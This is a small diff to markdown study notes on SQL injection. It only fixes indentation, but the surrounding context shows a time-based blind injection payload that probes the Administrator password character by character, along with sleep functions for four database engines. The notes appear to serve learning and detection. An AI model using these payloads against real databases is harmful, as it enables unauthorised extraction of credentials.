@@ -59,9 +59,9 @@ For a UNION query to work, two key requirements must be met:
 > '; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
 
 > dbms_pipe.receive_message(('a'),10) Oracle
->	WAITFOR DELAY '0:0:10' Microsoft
->	SELECT pg_sleep(10) PostgreSQL
->	SELECT sleep(10) MySQL
+> WAITFOR DELAY '0:0:10' Microsoft
+> SELECT pg_sleep(10) PostgreSQL
+> SELECT sleep(10) MySQL
 ```
 
 #### How to detect SQL injection vulnerabilities
